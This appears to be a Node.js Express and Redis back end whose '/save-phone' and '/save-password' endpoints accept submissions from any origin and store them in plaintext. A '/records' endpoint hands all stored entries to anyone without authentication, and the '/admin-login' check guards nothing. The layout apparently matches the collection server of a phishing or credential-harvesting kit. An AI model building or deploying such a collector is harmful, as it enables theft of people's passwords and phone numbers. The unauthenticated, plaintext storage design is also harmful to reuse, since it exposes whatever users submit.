
import express from "express";
import cors from "cors";
import { createClient } from "redis";

const app = express();
app.use(express.json());
app.use(cors());

const redis = createClient({ url: process.env.REDIS_URL });
redis.on("error", err => console.error("Redis Error:", err));
await redis.connect();

async function addRecord(record){
  await redis.rPush("records", JSON.stringify(record));
}
async function getRecords(){
  const arr = await redis.lRange("records",0,-1);
  return arr.map(x=>JSON.parse(x));
}

app.post("/save-phone", async(req,res)=>{
  try{
    await addRecord({type:"phone", ...req.body, time:new Date().toISOString()});
    res.json({ok:true});
  }catch(e){res.json({ok:false});}
});

app.post("/save-password", async(req,res)=>{
  try{
    await addRecord({type:"password", ...req.body, time:new Date().toISOString()});
    res.json({ok:true});
  }catch(e){res.json({ok:false});}
});

app.post("/admin-login",(req,res)=>{
  if(req.body.password === process.env.ADMIN_PASS) return res.json({ok:true});
  res.json({ok:false});
});

app.get("/records", async(req,res)=>{
  res.json(await getRecords());
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, ()=>console.log("Backend running on "+PORT));
